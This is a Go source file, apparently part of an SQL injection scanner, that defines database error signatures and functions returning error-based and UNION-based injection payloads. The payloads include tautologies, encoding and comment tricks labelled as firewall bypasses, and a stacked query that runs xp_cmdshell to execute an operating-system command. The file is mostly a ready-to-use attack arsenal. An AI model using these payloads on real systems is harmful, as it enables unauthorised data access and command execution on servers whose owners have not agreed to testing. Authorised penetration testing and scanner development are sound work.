package sqliengine

// ============================================================
//  SQLi PAYLOAD ARSENAL — 120+ Payloads (WAF-Adaptive)
// ============================================================

// DBErrors is the master list of database error messages to detect.
var DBErrors = []string{
	// MySQL / MariaDB
	"SQL syntax", "mysql_fetch", "mysql_num_rows", "mysql_query",
	"Warning: mysql_", "You have an error in your SQL syntax",
	"MariaDB server version", "MySqlException",

	// Oracle
	"ORA-01756", "ORA-00907", "ORA-00933", "ORA-01722",
	"Oracle Error", "Oracle JDBC", "oracle.jdbc.driver",

	// PostgreSQL
	"PostgreSQL query failed", "pg_query()", "PSQLException",
	"unterminated quoted string", "syntax error at or near",

	// MSSQL
	"SQLServer JDBC Driver", "Microsoft OLE DB Provider",
	"Unclosed quotation mark", "ODBC SQL Server Driver",
	"Microsoft SQL Native Client error", "mssql_query()",

	// DB2
	"CLI Driver", "DB2 SQL error", "SQLCODE",

	// SQLite
	"SQLite/JDBCDriver", "sqlite3.OperationalError",
	"SQLITE_ERROR", "unrecognized token",

	// Generic
	"System.Data.SqlClient.SqlException", "Syntax error in query",
	"SQL command not properly ended", "unexpected end of SQL command",
	"invalid input syntax for", "Query failed",
	"StatementCallback; bad SQL grammar",
}

// GetErrorPayloads returns error-based SQLi payloads, adapted for WAF.
func GetErrorPayloads(wafType string) []string {
	base := []string{
		// Classic
		"'", `"`, "`", "' OR '1'='1",
		`" OR "1"="1`, "' OR 1=1 --", `" OR 1=1 --`,
		"') OR ('1'='1", "1' OR '1'='1'/*",

		// Comment obfuscation
		"'/**/OR/**/'1'='1",
		"'%09OR%09'1'='1",
		"' /*!OR*/ '1'='1",
		"'/*!50000OR*/'1'='1",

		// Null byte
		"'\\x00",
		"%27%00",

		// Double encode
		"%27", "%2527",

		// Case variation
		"' Or '1'='1", "' oR '1'='1",

		// Scientific notation
		"0e1' OR 1=1--",
		"1e0' OR 1=1--",

		// Hex encoding
		"0x27", "0x2720OR2031=31",

		// Stacked queries
		"'; SELECT 1--",
		"'; EXEC xp_cmdshell('whoami')--",

		// Subquery
		"' AND (SELECT 1 FROM dual)='1",
		"' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
	}

	// Add WAF-specific bypass payloads
	if wafType != "" {
		base = append(base, GetWAFBypassPayloads(wafType)...)
	}

	return base
}

// GetUnionPayloads returns UNION-based payloads.
func GetUnionPayloads(columns int, canary string) []string {
	nulls := ""
	for i := 1; i < columns; i++ {
		nulls += ",NULL"
	}

	return []string{
		// String in first column
		"0 UNION SELECT '" + canary + "'" + nulls + "--",
		// String in each column position
		buildUnionWithCanaryAtPosition(columns, canary),
		// UNION ALL variant
		"0 UNION ALL SELECT '" + canary + "'" + nulls + "--",
		// With comment
		"0 /*!UNION*/ /*!SELECT*/ '" + canary + "'" + nulls + "--",
	}
}

func buildUnionWithCanaryAtPosition(columns int, canary string) string {
	// Try canary at position 2 (common for display columns)
	parts := make([]string, columns)
	for i := range parts {
		if i == 1 && columns > 1 {
			parts[i] = "'" + canary + "'"
		} else {
			parts[i] = "NULL"
		}
	}
	return "0 UNION SELECT " + joinStrings(parts, ",") + "--"
}

func joinStrings(parts []string, sep string) string {
	result := ""
	for i, p := range parts {
		if i > 0 {
			result += sep
		}
		result += p
	}
	return result
}
